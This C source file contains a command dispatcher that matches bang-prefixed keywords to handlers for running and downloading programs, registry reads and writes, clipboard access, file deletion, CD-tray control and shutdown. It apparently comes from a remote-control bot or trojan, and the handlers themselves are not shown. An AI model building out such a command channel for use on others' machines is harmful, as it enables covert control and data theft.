#include "CheckCmdLine.h"
#include "CmdInc.h"

bool ExecuteCommand(char Command[500]);

bool ExecuteCommand(char Command[500])
{
	char			WhatToDo[9];

	lstrcpyn(WhatToDo, Command, 8);

	if(lstrcmp(WhatToDo, "!msgbox") == 0)
		if(msgbox(Command) == true) return true;

	if(lstrcmp(WhatToDo, "!execut") == 0)
		if(execute(Command) == true) return true;

	if(lstrcmp(WhatToDo, "!mouse ") == 0)
		if(mouse(Command) == true) return true;

	if(lstrcmp(WhatToDo, "!downlo") == 0)
		if(download(Command) == true) return true;

	if(lstrcmp(WhatToDo, "!window") == 0)
		if(windowspath() == true) return true;

	if(lstrcmp(WhatToDo, "!system") == 0)
		if(systempath() == true) return true;

	if(lstrcmp(WhatToDo, "!locati") == 0)
		if(location() == true) return true;

	if(lstrcmp(WhatToDo, "!copyfi") == 0)
		if(copyfile(Command) == true) return true;

	if(lstrcmp(WhatToDo, "!movefi") == 0)
		if(movefile(Command) == true) return true;

	if(lstrcmp(WhatToDo, "!delete") == 0)
		if(deletefile(Command) == true) return true;

	if(lstrcmp(WhatToDo, "!regwri") == 0)
		if(regwrite(Command) == true) return true;

	if(lstrcmp(WhatToDo, "!regrea") == 0)
		if(regread(Command) == true) return true;

	if(lstrcmp(WhatToDo, "!fileli") == 0)
		if(filelist(Command) == true) return true;

	if(lstrcmp(WhatToDo, "!dirlis") == 0)
		if(dirlist(Command) == true) return true;

	if(lstrcmp(WhatToDo, "!getdir") == 0)
		if(getdirectory() == true) return true;

	if(lstrcmp(WhatToDo, "!setdir") == 0)
		if(setdirectory(Command) == true) return true;

	if(lstrcmp(WhatToDo, "!input ") == 0)
		if(input(Command) == true) return true;

	if(lstrcmp(WhatToDo, "!reboot") == 0)
		if(reboot() == true) return true;

	if(lstrcmp(WhatToDo, "!shutdo") == 0)
		if(shutdown() == true) return true;

	if(lstrcmp(WhatToDo, "!cdrom ") == 0)
		if(cdrom(Command) == true) return true;

	if(lstrcmp(WhatToDo, "!start ") == 0)
		if(start(Command) == true) return true;

	if(lstrcmp(WhatToDo, "!getcli") == 0)
		if(getclipboard() == true) return true;

	if(lstrcmp(WhatToDo, "!setcli") == 0)
		if(setclipboard(Command) == true) return true;

	if(lstrcmp(WhatToDo, "!monito") == 0)
		if(monitor(Command) == true) return true;

	return false;
}
